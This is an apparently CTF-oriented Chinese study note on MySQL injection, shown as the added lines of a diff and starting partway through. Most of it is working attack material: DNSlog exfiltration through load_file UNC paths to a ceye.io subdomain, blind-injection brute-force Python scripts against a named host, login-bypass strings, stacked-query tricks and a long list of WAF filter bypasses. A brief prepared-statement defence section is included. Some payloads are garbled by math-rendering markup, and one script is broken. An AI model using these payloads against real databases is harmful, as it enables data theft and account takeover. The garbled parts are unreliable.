+<p>原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</p>
+<p>就是使用mysql_set_charset进行指定。</p>
+<p>上述的两个条件是“与”运算的关系，少一条都不行。\</p>
+<p>https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/</p>
+<h2 id="dns注入">DNS注入</h2>
+<p>在测试一些网站的时候，一些注入都是<code>无回显</code>的，所以我们一般会采用<code>盲注法，延时注入或布尔注入</code>，有些情况下布尔注入不可以使用，但是延时注入的时间又太慢，我们就会使用一种高效的方法—<code>DNS注入</code></p>
+<p>DNS注入要求<br>
+DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
+<p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>
+2、当secure_file_priv为G:\，就可以读取G盘的文件。<br>
+3、当secure_file_priv为null，load_file就不能加载文件。</p>
+<p>无论secure_file_priv 为任何属性均可以使用dns注入前提<br>
+通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。<br>
+数据库在配置中允许域名解析时，到数据库中查看：</p>
+<pre><code>show variables like ‘skip_name_resolve’;
+</code></pre>
+<p>默认情况下MYSQL域名解析禁止 开关试off的 所以不需要担心</p>
+<p>原理</p>
+<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息<br>
+简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息。</p>
+<p>这样说原理很抽象，下面通过实际例子看下。</p>
+<p><a href="http://ceye.io/">http://ceye.io</a> 这是一个免费的记录dnslog的平台，我们注册后到控制面板会给你一个二级域名：xxx.ceye.io,当我们把注入信息放到三级域名那里，后台的日志会记录下来</p>
+<p>本地复现</p>
+<p>首先去DNSlog网站获取一个子域名</p>
+<pre><code>select load_file('\\\\aaaa.x1rzd3.ceye.io\\ddd');
+</code></pre>
+<p>查看Dnslog是否有解析信息</p>
+<pre><code>select load_file(concat('\\\\',(select name from admin where id=1 ),'.x1rzd3.ceye.io\\ddd'));
+</code></pre>
+<p>为什么要\？</p>
+<p>UNC路径，对指定的域名进行DNS查询，通过查询域名递归的方式，DNS服务器可以将返回数据通过DNS协议带出去。</p>
+<pre><code>  PS：路径是windows下的特性，默认安装的linux下不存在这样的功能    
+</code></pre>
+<p>为什么要\？</p>
+<p>\原本是两条 但经过解析只会变成一条所以 要进行转义变成\</p>
+<pre><code> PS： 不可以.x1rzd3.ceye.io 还要.x1rzd3.ceye.io\乱写数字字母都可.x1rzd3.ceye.io\\fkjs
+</code></pre>
+<p>Payload</p>
+<pre><code>select load_file(concat('\\\\'(select name from admin where id=1 ),'.x1rzd3.ceye.io\\ddd'));
+</code></pre>
+<p>参考链接：</p>
+<p>https://blog.csdn.net/Auuuuuuuu/article/details/88082184</p>
+<p>https://www.cnblogs.com/afanti/p/8047530.html</p>
+<h2 id="insert注入">Insert注入</h2>
+<p>布尔注入</p>
+<pre><code>insert into admin(id,name) values ($ed,$user)
+</code></pre>
+<p>Payload<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>=</mo><mo>(</mo><mi>i</mi><mi>f</mi><mo>(</mo><mi>o</mi><mi>r</mi><mi>d</mi><mo>(</mo><mi>m</mi><mi>i</mi><mi>d</mi><mo>(</mo><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mo>(</mo><mo>)</mo><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo>)</mo><mo>)</mo><mo>&gt;</mo><mn>1</mn><mo separator="true">,</mo><mi>T</mi><mi>r</mi><mi>u</mi><mi>e</mi><mo separator="true">,</mo><mi>f</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>e</mi><mo>)</mo><mo>)</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>(</mo><mi>i</mi><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>s</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">user = (if(ord(mid(database(),1,1))&gt;1,True,false))
+insert into admin(id,name) values (</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mopen">(</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">(</span></span></span></span>ed,$user)</p>
+<p>ID NAME<br>
+A G E<br>
+1 0 19<br>
+2 1 34<br>
+当name = 1 则为true 0为false<br>
+多行注入</p>
+<p>insert into admin(id,name) values (<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>d</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">ed,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mpunct">,</span></span></span></span>user)<br>
+Payload</p>
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">）</mi><mo separator="true">,</mo><mo>(</mo><mn>1</mn><mo separator="true">,</mo><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>)</mo><mo separator="true">,</mo><mo>(</mo><mn>2</mn><mo separator="true">,</mo><mi>h</mi><mi>a</mi><mi>c</mi><mi>k</mi><mi>e</mi><mi>r</mi><mo>)</mo><mi>i</mi><mi>n</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi><mo>(</mo><mi>i</mi><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi>s</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">user = 1）,(1,admin),(2,hacker)
+insert into admin(id,name) values (</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord cjk_fallback">）</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mopen">(</span></span></span></span>ed,$user)</p>
+<h2 id="delete注入">Delete注入</h2>
+<h2 id="update注入">Update注入</h2>
+<p>更改密码</p>
+<p>类似更改密码也有可能出现漏洞</p>
+<p>用户注册过程</p>
+<p>第一次insert</p>
+<p>用户想覆盖注册admin 但是系统通过后台校验禁止注册admin</p>
+<p>用户注册一个名为hacker的用户名</p>
+<p>更改密码</p>
+<p>第二次update</p>
+<p>update admin set password=’22222’ where name=’hacker’;</p>
+<p>这是一个正常过程</p>
+<p>入侵过程</p>
+<p>用户注册了一个admin’#的账户</p>
+<p>再修改密码过程中</p>
+<p>update admin set password=’22222’ where name=’admin’#’;</p>
+<p>在此过程出现了重置admin用户的漏洞</p>
+<h1 id="攻击方法">攻击方法</h1>
+<h2 id="异或注入">异或注入</h2>
+<p>异或运算规则:<br>
+<code>1^1=0 0^0=0 0^1=1</code><br>
+<code>1^1^1=0 1^1^0=0</code><br>
+构造payload:<code>'^ascii(mid(database(),1,1)=98)^0</code></p>
+<pre><code class="language-mysql">^if((select(ascii(mid(group_concat(table_name),1,1))&gt;100)from(information_schema.tables)where(table_schema)like(0x6461696d6132)),1,0);
+</code></pre>
+<p>过滤了^</p>
+<p>=“”</p>
+<pre><code>&quot;0^&quot; + &quot;(ascii(substr((select(password)from(waf01)),{0},1))&gt;{1})&quot;.format(i,mid)
+</code></pre>
+<pre><code>0'(ascii((select(passwd)from(waf01))from(1))&gt;0)^'0
+ascii()&gt;0
+select(passwd)from(waf01))from(1)
+</code></pre>
+<pre><code class="language-python">import requests
+import time
+
+urls=&quot;http://opence.com/waf01/index.php?username=&quot;
+a=&quot;&quot;
+for i in range(1,10):
+	for j in range(1,128):
+		strs= &quot;0'^&quot; + &quot;(ascii(mid((passwd)from({0})))&gt;{1})&quot;.format(i,j)+&quot;^'0&quot;
+		url=urls+strs
+		html = requests.get(url)
+		print(j)
+		if &quot;username=admin&quot; in html.text:
+			a=a+chr(j)
+			print(a)
+			break
+print(a)
+
+
+
+</code></pre>
+<p>二分法代码</p>
+<pre><code class="language-python">import requests
+import time
+urls=&quot;http://opence.com/waf01/index.php?username=&quot;
+str=&quot;&quot;
+min=32
+max=128
+for i in range(1,30):
+    while min&lt;max:
+        mid =(min+max)//2
+        r=request.get(urls+payload)
+        if admin in r.text:
+            min=mid+1
+        else:
+            max=mid
+     if mid!=32:
+        str=str+chr(mid)
+        print(str)
+</code></pre>
+<h2 id="万能密码">万能密码</h2>
+<p>0x01未过滤<code>'</code></p>
+<pre><code>数据库查询语句
+select * from users where username='' and password='';
+</code></pre>
+<pre><code>username=' or 1=1#
+</code></pre>
+<p>0X02未过滤<code>\</code>但过滤<code>'</code></p>
+<pre><code>数据库查询语句
+select * from users where username='' and password='';
+</code></pre>
+<pre><code>用户名：admin\
+密码：or 1 #     //等号也被过滤了
+
+即构造了：select * from users where username='admin\' and password='or 1 #'
+
+布尔注入脚本
+select * from users where username='admin\' and password='^ (ascii(substr((password),%d,1))&gt;%d)#'
+</code></pre>
+<p>https://blog.csdn.net/qq_45521281/article/details/105810265</p>
+<h2 id="利用预编译注入">利用预编译注入</h2>
+<p><strong>黑名单绕过 concat 拼接语句</strong></p>
+<pre><code class="language-mysql">//定义预编译语句
+PREPARE a FROM preparable_stmt;
+
+//执行预编译语句
+EXECUTE a [USING @var_name [, @var_name] ...];
+
+-1';PREPARE hacker from concat('select flag from `1919810931114514`');EXECUTE hacker;#
+</code></pre>
+<h2 id="handler查询"><strong>handler查询</strong></h2>
+<p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>
+<strong>handler可以用于MyISAM和InnoDB表。</strong><br>
+使用方法：<br>
+handler table_name open打开一张表<br>
+handel table_name read first读取第一行内容，<br>
+handel table_name read next依次获取其它行<br>
+最后一行执行之后再执行handel table_name read next会返回一个空的结果。</p>
+<pre><code>-1';handler `1919810931114514` open;handler `1919810931114514` read first;#
+</code></pre>
+<h2 id="基于约束的sql攻击">基于约束的SQL攻击</h2>
+<p>https://blog.csdn.net/qq_41617034/article/details/106431679</p>
+<p>挖洞可以使用，任意账号注册</p>
+<pre><code class="language-php">示例
+&lt;?php
+$username = mysql_real_escape_string($_GET['username']);
+$password = mysql_real_escape_string($_GET['password']);
+$query = &quot;SELECT *
+          FROM users
+          WHERE username='$username'&quot;;
+$res = mysql_query($query, $database);
+if($res) {
+  if(mysql_num_rows($res) &gt; 0) {
+  }
+  else {
+    $query = &quot;INSERT INTO users(username, password)
+              VALUES ('$username','$password')&quot;;
+</code></pre>
+<p>主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。</p>
+<p>在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将<strong>较短的字符串末尾填充空格</strong></p>
+<p>修复：</p>
+<p>预防手段<br>
+1：唯一性。查询结果大于1查询不成立。<br>
+2.对输入的长度进行限制。<br>
+3.使用id作为主键。<br>
+4.使用最新版本的mysql（5.7.17）已经无效，已经修复。</p>
+<p>基于无列名注入</p>
+<h2 id="无列名注入">无列名注入</h2>
+<p>原理</p>
+<pre><code>select id,username from admin 
+select * from admin 
+
+=select `3` from (selct 1,2 union select * from admin )a
+=select b from (selct 1,2 as b union select * from admin )a
+末尾的 a 可以是任意字符，用于命名。
+</code></pre>
+<p>https://zhuanlan.zhihu.com/p/98206699</p>
+<h1 id="防御">防御</h1>
+<p>建议参考一下内容</p>
+<p>https://blog.csdn.net/huanghelouzi/article/details/82995313</p>
+<p>https://blog.csdn.net/a15803617402/article/details/82789477</p>
+<h3 id="预编译防止注入">预编译防止注入</h3>
+<pre><code>MySQL执行预编译分为如三步：
+
+执行预编译语句，例如：prepare myfun from 'select * from t_book where bid=?'
+设置变量，例如：set @str='b1'
+执行语句，例如：execute myfun using @str
+</code></pre>
+<p>1.连接数据库（mysqli）</p>
+<pre><code class="language-php">$username=&quot;root&quot;;
+$password=&quot;root&quot;;
+$localhost=&quot;127.0.0.1&quot;;
+$db=&quot;daima&quot;;
+
+$conn=mysqli_connect($localhost,$username,$password,$db);
+#查询
+$sql=&quot;select Np,Nr from jms_admin where id=?&quot;;
+$stmt=$conn-&gt;prepare($sql);
+$id=1;
+$stmt-&gt;bind_param(&quot;i&quot;,$id);
+$stmt-&gt;excute();
+$stmt-&gt;bind_result($Np);
+
+
+
+</code></pre>
+<h2 id="ctf题目">CTF题目</h2>
+<p>堆叠注入</p>
+<p>绕过黑名单限制</p>
+<p>buuctf-&gt;easysql</p>
+<p>https://blog.csdn.net/weixin_44037296/article/details/105190639</p>
+<p>https://blog.csdn.net/qq_43428139/article/details/105774751</p>
+<p>https://www.cnblogs.com/Vinson404/p/7253255.html</p>
+<p>关键词过滤</p>
+<h2 id="sql入绕过">sql入绕过</h2>
+<h3 id="关键字绕过">关键字绕过</h3>
+<h4 id="大小写绕过">大小写绕过</h4>
+<p>常用于 <code>waf</code>的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>
+例如：waf过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p>
+<pre><code class="language-sql">mysql&gt; select * from users where id = -1 union select 1,2,3
+mysql&gt; select * from users where id = -1 union Select 1,2,3;
+</code></pre>
+<h4 id="内联注释绕过">内联注释绕过</h4>
+<p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
+<pre><code class="language-sql">mysql&gt; select * from users where id = -1 union /*!select*/ 1,2,3;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | 2        | 3        |
++----+----------+----------+
+</code></pre>
+<h4 id="双写关键字绕过">双写关键字绕过</h4>
+<p>在某一些简单的<code>waf</code>中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p>
+<h4 id="特殊编码绕过">特殊编码绕过</h4>
+<ul>
+<li>十六进制绕过</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where username = 0x7465737431;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
++----+----------+----------+
+123456
+</code></pre>
+<ul>
+<li>ascii编码绕过<br>
+<code>Test</code> 等价于<br>
+<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code><br>
+tip:好像新版mysql不能用了</li>
+</ul>
+<h4 id="绕过">&lt;&gt;绕过:</h4>
+<pre><code class="language-mysql">unio&lt;&gt;n sel&lt;&gt;ect(可能是有些网站为了防止xss注入,所以过滤了&lt;&gt;,参照i春秋sql)
+</code></pre>
+<h2 id="关键词替换">关键词替换</h2>
+<h3 id="注释符号绕过">注释符号绕过</h3>
+<p>常用的注释符有</p>
+<pre><code>-- 注释内容
+# 注释内容
+/*注释内容*/\
+;
+</code></pre>
+<h3 id="空格过滤绕过">空格过滤绕过</h3>
+<p>一般绕过空格过滤的方法有以下几种方法来取代空格</p>
+<pre><code class="language-mysql">/**/
+()
+回车(url编码中的%0a)
+`(tap键上面的按钮)
+tap
+两个空格
+%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
+</code></pre>
+<h4 id="无需空格注入">无需空格注入</h4>
+<pre><code class="language-mysql">查询表名
+
+admin'union(select(table_name),(2),(3)from(information_schema.tables)where(table_schema=0x74657374))#
+
+查询列名
+admin'union((select(column_name),(2),(3)from(information_schema.columns)where(table_schema=0x74657374)and(table_name=0x75736572)))#
+
+查询数据
+admin'union(select(username),(password),(3)from(user))#
+
+获取表名
+admin'and(select(ascii(mid(group_concat(table_name),1,1))=116)from(information_schema.columns)where(table_schema=0x74657374))#
+
+获取字段名
+admin'and(select(ascii(mid(group_concat(column_name),1,1))=73)from(information_schema.columns)where(table_schema=0x74657374)and(table_name=0x75736572))#
+
+#时间盲注获取数据库名称
+admin'and(if((ascii(mid(database(),1,1))=116),sleep(5),0))#
+
+#布尔注入
+^if((select(ascii(mid(group_concat(table_name),1,1))&gt;100)from(information_schema.tables)where(table_schema)like(0x6461696d6132)),1,0);
+</code></pre>
+<h3 id="过滤or-and-xor-not-绕过">过滤or and xor not 绕过</h3>
+<pre><code class="language-mysql">and = &amp;&amp;
+or = ||
+xor = | # 异或
+not = !
+</code></pre>
+<h3 id="过滤等号绕过">过滤等号=绕过</h3>
+<ul>
+<li>不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</li>
+</ul>
+<p>正常加上通配符的<code>like</code>：</p>
+<pre><code class="language-sql">mysql&gt; select * from users where username like &quot;test%&quot;;
+</code></pre>
+<p>不加上通配符的<code>like</code>可以用来取代<code>=</code>：</p>
+<pre><code class="language-sql">mysql&gt; select * from users where id like 1;
+</code></pre>
+<ul>
+<li>rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>
+用来取代<code>=</code>时，<code>rlike</code>的用法和上面的<code>like</code>一样，没有通配符效果和<code>=</code>一样</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where id rlike 1;
+</code></pre>
+<ul>
+<li>regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where id regexp 1;
+</code></pre>
+<ul>
+<li>使用大小于号来绕过</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where id &gt; 1 and id &lt; 3;
+</code></pre>
+<ul>
+<li>&lt;&gt; 等价于 !=<br>
+所以在前面再加一个<code>!</code>结果就是等号了</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where !(id &lt;&gt; 1);
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+</code></pre>
+<p>等号绕过也可以使用strcmp(str1,str2)函数、between关键字等，具体可以参考后面的<code>过滤大小于号绕过</code></p>
+<h3 id="过滤大小于号绕过">过滤大小于号&lt;&gt;绕过</h3>
+<p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过</p>
+<ul>
+<li>greatest(n1, n2, n3…):返回n中的最大值</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
++----+----------+----------+
+</code></pre>
+<ul>
+<li>least(n1,n2,n3…):返回n中的最小值</li>
+<li>strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),117);
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
++----+----------+----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from users where id = 1 and strcmp(ascii(substr(username,1,1)),116);
+Empty set (0.00 sec)
+12345678910
+</code></pre>
+<ul>
+<li>in关键字</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and substr(username,1,1) in ('t');
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
++----+----------+----------+
+1 row in set (0.01 sec)
+
+mysql&gt; select * from users where id = 1 and substr(username,1,1) in ('y');
+Empty set (0.00 sec)
+12345678910
+</code></pre>
+<ul>
+<li>between a and b:范围在a-b之间</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users where id between 1 and 2;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
+|  2 | user2    | pass1    |
++----+----------+----------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from users where id = 1 and substr(username,1,1) between 'a' and 'b';
+Empty set (0.00 sec)
+
+mysql&gt; select * from users where id = 1 and substr(username,1,1) between 'a' and 't';
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
++----+----------+----------+
+1 row in set (0.00 sec)
+12345678910111213141516171819
+</code></pre>
+<p>使用between a and b判等</p>
+<pre><code class="language-sql">mysql&gt; select * from users where id = 1 and substr(username,1,1) between 't' and 't';
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
++----+----------+----------+
+123456
+</code></pre>
+<h3 id="过滤引号绕过">过滤引号绕过</h3>
+<ul>
+<li>使用十六进制</li>
+</ul>
+<pre><code class="language-sql">select column_name  from information_schema.tables where table_name=0x7573657273;
+1
+</code></pre>
+<ul>
+<li>宽字节</li>
+</ul>
+<p>常用在web应用使用的字符集为<code>GBK</code>时，并且过滤了引号，就可以试试宽字节。</p>
+<pre><code class="language-mysql"># 过滤单引号时
+%bf%27 %df%27 %aa%27
+12
+%df\’ = %df%5c%27=縗’
+1
+</code></pre>
+<h3 id="过滤逗号绕过">过滤逗号绕过</h3>
+<p>sql盲注时常用到以下的函数：</p>
+<pre><code class="language-sql">- substr()
+  - substr(string, pos, len):从pos开始，取长度为len的子串
+  - substr(string, pos):从pos开始，取到string的最后
+  
+- substring()
+  - 用法和`substr()`一样
+  
+- mid()
+  - 用法和`substr()`一样，但是`mid()`是为了向下兼容`VB6.0`，已经过时，以上的几个函数的pos都是从1开始的
+  
+- left()和right()
+  - left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串
+  
+- limit
+  - limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始
+  
+- ascii()和char()
+  - ascii(char):把char这个字符转为ascii码
+  - char(ascii_int):和ascii()的作用相反，将ascii码转字符
+</code></pre>
+<p>回到正题，如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用<code>from pos for len</code>，其中pos代表从pos个开始读取len长度的子串<br>
+例如在<code>substr()</code>等函数中，常规的写法是</p>
+<pre><code class="language-sql">mysql&gt; select substr(&quot;string&quot;,1,3);
++----------------------+
+| substr(&quot;string&quot;,1,3) |
++----------------------+
+| str                  |
++----------------------+
+123456
+</code></pre>
+<ul>
+<li>如果过滤了逗号，可以这样使用<code>from pos for len</code>来取代</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select substr(&quot;string&quot; from 1 for 3);
++-------------------------------+
+| substr(&quot;string&quot; from 1 for 3) |
++-------------------------------+
+| str                           |
++-------------------------------+
+1 row in set (0.00 sec)
+1234567
+</code></pre>
+<p>在sql盲注中，如果过滤逗号，以下参考下面的写法绕过</p>
+<pre><code>mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 120;
++----------------------------------------------+
+| ascii(substr(database() from 1 for 1)) &gt; 120 |
++----------------------------------------------+
+|                                            0 |
++----------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select ascii(substr(database() from 1 for 1)) &gt; 110;
++----------------------------------------------+
+| ascii(substr(database() from 1 for 1)) &gt; 110 |
++----------------------------------------------+
+|                                            1 |
++----------------------------------------------+
+1234567891011121314
+</code></pre>
+<ul>
+<li>也可使用<code>join</code>关键字来绕过</li>
+</ul>
+<pre><code class="language-sql">mysql&gt; select * from users  union select * from (select 1)a join (select 2)b join(select 3)c;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+|  1 | test1    | pass     |
+|  2 | user2    | pass1    |
+|  3 | test3    | pass1    |
